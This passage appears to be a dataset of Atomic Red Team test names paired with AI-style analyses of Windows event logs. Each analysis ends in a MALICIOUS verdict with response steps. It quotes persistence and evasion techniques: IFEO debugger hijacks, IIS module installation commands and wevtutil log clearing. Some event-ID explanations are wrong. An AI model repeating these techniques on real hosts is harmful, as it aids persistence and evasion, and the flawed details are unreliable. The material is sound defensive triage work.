3. **Alert Relevant Security Irrespective**: Notify the security or IT administration team and ensure they are apprised of the findings for coordinated incident response.
4. **Incident Reporting & Documentation**: Document all findings, processes involved, and steps taken for reporting, compliance, and to aid future threat intelligence initiatives.
5. **Review of Administrative Access and Policies**: Review and restrict administrative privileges to reduce the risk of similar issues in the future. Consider updating policies concerning log handling and utility usage.

These actions will help mitigate the current risk and strengthen the security posture against future threats."
GlobalFlags in Image File Execution Options,"Based on the provided Windows event logs, the analysis reveals the following suspicious and potentially malicious activities:

### Suspicious Activities:
1. **Log File Clearing:** The logs indicate multiple log file clearing activities by the user `admin_test`:
   - System log (EventID: 104)
   - Windows PowerShell log
   - Security log (EventID: 1102)

   Log clearing is generally undertaken to cover tracks and is a strong indicator of potential malicious activity, especially when logs from critical sources are cleared simultaneously.

2. **PowerShell Execution:** There are multiple occurrences of PowerShell being executed with suspicious command-line arguments:
   - Modification of registry keys related to `whoami.exe` with commands that would execute `calc.exe` upon specific triggers. This behavior is indicative of persistence mechanisms or an attempt to hijack a process for executing unwanted commands.

   The specific PowerShell command observed involves creating or modifying registry entries that can redirect or control process behavior related to `whoami.exe`.

3. **Repeated Process Creation:**
   - Frequent spawning of processes like `conhost.exe`, `whoami.exe`, `wevtutil.exe`, and `svchost.exe` with high integrity levels by the user `admin_test`.
   - Such activity may be a sign of enumerating the environment or engaging in privilege escalation attempts.

### Malicious Activities:
These activities clearly indicate malicious intent:
1. **Registry Manipulation via PowerShell:** The use of PowerShell to modify registry keys for controlling execution behavior and launching unexpected applications like `calc.exe` suggests an attempt at subverting process execution and is indicative of malware or post-exploitation activity.

2. **System and Security Logs Clearing:** As mentioned, the clearing of event logs by a user with elevated privileges is typically associated with malicious attempts to hide unauthorized activities.

### Conclusion and Guidance:
Given the findings, especially the combination of registry tweaks using PowerShell leading to unexpected process executions and the deliberate clearing of log files, the activity documented in these logs is classified as **MALICIOUS**. This activity is consistent with malware behavior and potential cyber-attacks aiming at privilege escalation, persistence, or covering tracks after unauthorized access.

### Recommended Actions:
1. **Immediate Containment:**
   - Secure the affected host by isolating it from the network to prevent further dispersal or damage.
   - Assess whether similar activity has occurred on other systems in the network.

2. **In-depth Forensics:**
   - Conduct a comprehensive forensic analysis of the affected system to extract detailed information on the nature and extent of the compromise.
   - Review additional logs, especially older backups, for patterns that preceded the logs-clearing events.

3. **Remediation Steps:**
   - Reverse any unauthorized changes made via the registry.
   - Restore the system from known good backups, if feasible.
   - Strengthen system and network defenses to detect and prevent similar activities in the future (e.g., enhanced logging, PowerShell script block logging, restricted access policies).

4. **Monitoring:**
   - Increase monitoring of the network for similar activities or indicators of compromise.
   - Implement intrusion detection/prevention systems (IDS/IPS) focused on identifying anomalous behavior and unauthorized access attempts."
Office Application Startup Test Persistence (HKCU),"Upon reviewing the provided Windows event logs, I have identified several indicators that suggest potentially malicious activity. Here's a detailed analysis:

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the use of scripts that interact with Microsoft Word via `New-Object -COMObject ""Word.Application""`. While the creation of COM objects in PowerShell is not inherently malicious, this particular script is associated with the registry keys and DLLs located in a suspicious path: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1137.002\bin\officetest_x64.dll` and `officetest_x86.dll`. The DLL path and `AtomicRedTeam` are notable because Atomic Red Team refers to a known threat emulation tool used for testing defensive capabilities, indicating that these actions might be part of a simulation exercise or an actual exploit attempt.

2. **Process Execution and Log Clearing:**
   - The Sysmon logs show `powershell.exe` being launched followed by `wevtutil.exe cl` commands, which are used to clear event logs. `wevtutil.exe` has been executed multiple times to clear the `System`, `Security`, `Application`, and `Windows PowerShell` logs. Clearance of logs is a strong indicator of potential compromise as it suggests an attempt to cover tracks.

3. **Security, System, and PowerShell Event Logs Cleared:**
   - The event logs for System (EventID: 104), Security (EventID: 1102), and Windows PowerShell show explicit log clearance activities by the user `admin_test`. The clearing of security-related logs is a common tactic used by adversaries to hide their malicious activities from being detected by system administrators.

### Assessment:

The combination of custom PowerShell scripts and aggressive log clearing strongly points to potentially malicious activity. While it's possible that this is a part of penetration testing (due to the mention of Atomic Red Team), such activities should be carefully controlled and documented beforehand.

### Resolution:

Based on the evidence found in the logs, the activity appears to align with known indicators of compromise. Specifically, the suspicious PowerShell execution and the clearance of security logs suggest an attempt to evade detection and cover potentially unauthorized activities. Therefore, the situation should be taken seriously.

- **Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Investigation:**
   - Contact the server administrator or security team immediately to confirm whether the observed activities were authorized as part of a security assessment or penetration testing.
   - Verify with system administrators if the user `admin_test` was conducting known and authorized security tests.

2. **Isolate The System:**
   - If it is confirmed that these actions were unauthorized, consider isolating the affected host (Server002) to prevent any potential lateral movement or further unauthorized access until a full investigation is complete.

3. **Review Organization Policies:**
   - Review and enforce policies regarding the use of PowerShell and COM objects.
   - Ensure that all security tests and penetration testing activities are pre-approved and documented.

4. **Increase Monitoring:**
   - Set up alerts for similar patterns of PowerShell use and any attempt to clear or modify critical system logs.

5. **Digital Forensics:**
   - Gather forensic images of the system for comprehensive analysis of any potential data breach.

By following these steps, the organization can enhance its security posture while mitigating any potential risks associated with the described events."
Install IIS Module using AppCmd.exe,"### Analysis of Windows Event Logs

#### Summary of Investigations:
Upon reviewing the provided event logs from a Windows host, several indicators suggest suspicious activities potentially indicative of malicious behavior.

#### Detailed Findings:

1. **Security Log:**
   - **Event ID 1102**: Indicates that the security log was cleared. This is generally suspicious behavior, especially if it is done without backup because it could be an attempt to erase traces of potentially malicious activities. The action was performed by the user `admin_test`.

2. **System Log:**
   - **Event ID 104**: Multiple logs across Security, System, and Windows PowerShell have been cleared by the user `admin_test`. This behavior is often associated with attempts to cover tracks in a compromised system.

3. **Sysmon Log:**
   - **Process Execution (Event ID 1)**: 
     - Multiple instances of `wevtutil.exe` processes running with the `cl` (clear log) command indicate logs being cleared across several channels (Security, System, and Application). This aligns with log clearing activities noted in the Security and System logs.
     - `cmd.exe` execution with command line arguments that could potentially install or configure modules in IIS (`appcmd.exe install module...`). Such string manipulation could indicate unauthorized configuration changes or attacks on web services.
   - **PowerShell Execution (Event ID 5)**: Indicates the execution of `powershell.exe`, which without additional context could be benign; however, given the other activities present, this could be part of a script execution associated with the identified suspicious activity.
   
4. **Application Log:**
   - **Edge Update Events**: The repeated stopping of Edge Update services in close intervals could be benign as part of an update cycle; however, given the simultaneous suspicious activities in the system, this pattern is worth noting.

#### Assessment and Recommendation:
The collective behavior observed in these logs suggests coordinated clearing of event logs after potentially unauthorized or suspicious activity, possibly during a script or batch execution leveraging various Windows utilities. Such actions are strongly correlated with covering tracks post-malicious activities.

Therefore, the resolution of the investigation leads to the conclusion: 

### Resolution: **MALICIOUS**

#### Recommended Next Steps:
1. **Immediate Isolation**: Disconnect the server `Server002` from the network to prevent further potential malicious activities or lateral movement within the network.
2. **Forensic Analysis**: Conduct an in-depth forensic analysis to capture volatile data and identify any rootkits or malware present on the system.
3. **Audit and Review**: Review user account activities, especially those of `admin_test`, and validate all executed commands and history.
4. **Log Restoration and Monitoring**: Restore event logs if possible from backups and set up enhanced monitoring to track similar future activities across the network.
5. **Security Update**: Ensure all systems, especially public-facing applications like IIS, are updated with the latest security patches.

Taking these actions will help mitigate the immediate risks and aid in identifying the extent and source of the compromise."
Attaches Command Prompt as a Debugger to a List of Target Processes,"Upon reviewing the provided logs, several observations can be made indicating potentially malicious activity:

1. **Clearing of Event Logs**: 
   - The security event log Entry 1102 indicates that the event log was cleared by the user `admin_test`. This is immediately followed by multiple executions of the `wevtutil.exe` command, which is used to clear event logs. This activity often points to an attempt to cover tracks following unauthorized activities on the system.

2. **PowerShell Script Execution**:
   - There is a suspicious PowerShell command execution evident from the logs. The script alters the registry to set a debugger for various accessibility applications (`osk.exe, sethc.exe, utilman.exe, etc.`) to `cmd.exe`. This technique is known as ""Image File Execution Options (IFEO) Hijacking"" and can be used for privilege escalation or persistence by triggering these programs to spawn a command prompt with elevated privileges.

3. **Use of High Integrity Level**:
   - Events in the Sysmon log show that the processes are running with high integrity levels, indicating that they have elevated privileges. This is expected for administrative tasks but increases the risk if used maliciously.

4. **Presence of System32 Executables**:
   - Numerous processes like `wevtutil.exe`, `hostname.exe`, `whoami.exe` are invoked from the System32 directory by `admin_test`. While these processes are typically benign, their sequential execution and association with the log-clearing events are concerning.

5. **Change of System Time**:
   - There are repeated entries to change the system time. Unauthorized time changes can interfere with the timeline of events for forensic analysis, suggesting concealment attempts.

Based on these observations, the activities observed in the logs align with tactics often employed in various malicious operations, including privilege escalation, defense evasion (log clearing), and persistence mechanisms (via script execution).

**Resolution**: **MALICIOUS**

### Recommendations:
- Immediate isolation of the affected machine (`Server002`) from the network to prevent further spread or damage.
- Conduct a thorough forensic investigation to identify potential compromise scope and gather additional evidence.
- Analyze potentially unauthorized access patterns, especially for the account `admin_test`.
- Review and strengthen system security policies, including monitoring and alerting mechanisms for sensitive activities (e.g., event log clearance, suspicious PowerShell executions).
- Scan the system for additional indicators of compromise, and perform thorough malware checks.
- Revise access controls and ensure the principles of least privilege are enforced."
Azure AD - Create a new user,"Based on the provided log entries, several points of interest and concern have been identified, suggesting potential malicious activity on the Windows host, Server002. Here is a detailed analysis:

1. **Event Log Clearing**: 
   - In the System logs, we see multiple entries with Event ID 104, which indicates that event logs were cleared. The involved user is `admin_test`.
   - In the Security logs, Event ID 1102, which also indicates log clearing, is the most concerning. This was executed by the same `admin_test` user.

2. **Processes and Command Execution**:
   - Sysmon logs frequently show the `wevtutil.exe` utility being used to clear logs (`cl` command). This tool is legitimate but can also be used by attackers to cover their tracks.
   - PowerShell logs exhibit the execution of potentially suspicious scripts, particularly one using `Connect-AzureAD`. The script seems aimed at creating an Azure AD user with specific(!) high-strength credentials. The script execution context involves `admin_test`.

3. **Privilege Usage**:
   - Security log Event ID 4672 indicates privileges associated with high-level activities such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`, granted to the `SYSTEM` account. The frequent setting of these privileges is often associated with lateral movement or high-level malware actions.

4. **Process Execution Anomalies**:
   - The creation of processes such as `PowerShell.exe` with script execution, alongside `wevtutil.exe`, aligns with known attack techniques for defense evasion and persistence.
   - Activities related to `MicrosoftEdgeUpdate.exe` appear several times; while legitimate, without context, frequent operations beyond regular updates may be noteworthy.

**Assessment and Resolution:**

The combination of event log clearing, PowerShell script execution intended to manipulate Azure AD, and utilization of the `wevtutil.exe` tool for log manipulation strongly align with techniques used for persistence and obfuscation in a compromised system.

Given these observations, it is prudent to conclude that the activity is MALICIOUS. Immediate containment and a thorough investigation are warranted, focusing on isolating the affected systems, resetting credentials for affected accounts, and reviewing network traffic for further indicators of compromise."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"### Detailed Analysis of Logs

#### Indicators and Analysis:

1. **Windows Event Log Clearing**:
   - **System Log and Security Log**: 
     - There are events indicating the clearing of event logs using `wevtutil.exe` for System, Security, and PowerShell channels around `2024-10-25 16:27:42`. 
     - Clearing event logs (`EventID: 104` for System and `EventID: 1102` for Security) without an apparent legitimate reason is often used by attackers to cover their tracks, indicating potentially malicious behavior, especially when done in conjunction with significant PowerShell activity.
   
2. **PowerShell Usage**:
   - A PowerShell script was executed using `powershell.exe`, which included registry manipulation and the copying of files with potentially malicious intent (specifically related to Office add-ins):
     - The script attempts to use a COM object to interact with PowerPoint, which is indicative of a technique often used for lateral movement or persistence (TTPs related to T1137).
     - The path `AtomicRedTeam` suggests a simulated attack or red team exercise based on commonly used adversarial tactics.

3. **Sysmon Logs**:
   - Multiple executions of `wevtutil.exe` were observed clearing different event logs, such as ""System"" and ""Windows PowerShell"", which signifies log tampering activity.
   - Additional commands using `powershell.exe` were observed, such as a script to interact with PowerPoint, indicating possible exploitation or simulation of attack scenarios.
   - The integrity level is ""High"" for these operations, suggesting they were executed with elevated privileges, possibly by a user with administrator rights.
  
4. **Edge Update Activity**:
   - The logs show activities related to Microsoft Edge updates, which are typically benign. However, given the context of other events, review of these process activities might be warranted to rule out exploitation of update mechanisms.

5. **Application Log**:
   - Normal activities were observed in relation to `edgeupdate` processes. These were contextually quiet around the suspicious activities.

6. **Unsuccessful PowerShell Operations**:
   - Error logs related to PowerShell indicate an attempt to interact with non-existent files or directories (`FileSystem path` issues). This might be indicative of misconfigured or incomplete execution of presumed malicious intent.

#### Assessment:

The event logs demonstrate command execution and event log clearing actions that are typically associated with malicious activities aimed at evading detection. The use of PowerShell to execute a script resembling real-world attack behavior (TTP) further exacerbates suspicion. The context and patterns align more closely with a possibly malicious activity or a well-simulated red team exercise.

#### Resolution:
- **MALICIOUS**: There is evidence suggesting potentially malicious activities, primarily due to log clearing activities, suspicious PowerShell usage, and potential registry manipulation and persistence mechanisms. Immediate incident response actions are advised to further assess and mitigate any potential compromise.

#### Guidance on How to Proceed:
1. **Initiate Incident Response**: Engage the incident response team to further investigate the host, ensuring a snapshot/image is taken for forensic analysis.
2. **Check for Persistence Mechanisms**: Examine the user's registry for unauthorized add-ins or modifications.
3. **Monitor Anomalous Activities**: Continue to monitor closely for any additional signs of compromise or further suspicious activities.
4. **Threat Hunt**: Identify any other systems affected and ascertain the entry point or vector for the activities observed.
5. **User Awareness**: Engage with the user `admin_test` to identify any known actions or to confirm that these actions were not recognized or authorized by them.

Taking these actions will help ensure the situation is managed effectively and prevent further exploitation."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"The provided logs from multiple channels provide a wealth of information, and several events stand out as potentially suspicious or indicative of malicious activity. Below is a detailed analysis:

1. **PowerShell Usage**:
   - The PowerShell command `powershell.exe & {New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\\system32\\inetsrv\\defdoc.dll}` observed multiple times is peculiar. While it uses a legitimate DLL (`defdoc.dll`), the usage of `New-WebGlobalModule` to create a global module in IIS might suggest attempts to establish persistence or an unauthorized configuration on a Web server. Such activities often warrant closer scrutiny, particularly if such commands aren't part of standard operations on this server.

2. **Log Clearing**:
   - The security (Event ID 1102) and system logs (Event ID 104) showing log clearance by `admin_test` is highly concerning. The execution of `wevtutil.exe cl` commands across multiple logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Windows PowerShell`) further supports this. Clearing event logs can be an indicator of malicious activity aiming to cover tracks.

3. **Sysmon Events**:
   - The presence of multiple Sysmon Process Creation (Event ID 1) and Image Load (Event ID 5) involving `wevtutil.exe` is consistent with the log-clearing activity mentioned above. This aligns with an attempt to remove traces of the activities being conducted on this system, a tactic commonly associated with sophisticated attacks.

4. **Edge Update Activity**:
   - The logs indicate extensive activity related to `MicrosoftEdgeUpdate.exe`. While updating software is not inherently suspicious, the frequency and volume of these updates around the same timeframe as other suspicious activities may require further validation to ensure it's not being used as a disguise for malicious operations. These entries reflect legitimate software updating processes but should be reviewed within the broader context.

**Assessment**:
Given the observed behavior, particularly the PowerShell execution potentially configuring IIS, multiple log clearances, and the concentration of these activities within a brief period, there are substantial indicators of malicious activity.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately perform a thorough forensic analysis of `Server002` to identify any unauthorized changes and potentially compromised files.
- Audit user accounts, particularly focusing on the account `admin_test`, for unauthorized access or privilege elevation.
- Review the server configuration, focusing on IIS settings and potential backdoors.
- Implement enhanced monitoring, focusing on PowerShell activities and Windows event logging.
- To prevent further damage, isolate the affected server from the network until a complete cleanup and security posture assessment is accomplished."
